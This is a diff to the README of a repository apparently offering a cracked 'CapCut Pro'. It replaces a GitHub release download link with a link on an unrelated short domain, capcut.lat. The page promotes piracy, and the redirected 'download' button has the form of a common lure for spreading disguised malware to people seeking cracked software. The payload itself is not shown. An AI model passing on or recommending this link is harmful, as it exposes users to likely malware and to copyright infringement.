@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-**[Download CapCut-Pro-Cracker](https://github.com/LegendVibrate/CapCut-Pro-Cracker/releases/download/677/CapCut-Pro-crack.zip)**
+**[Download CapCut-Pro-Cracker](https://capcut.lat/itfsz4)**
 
 ---
 
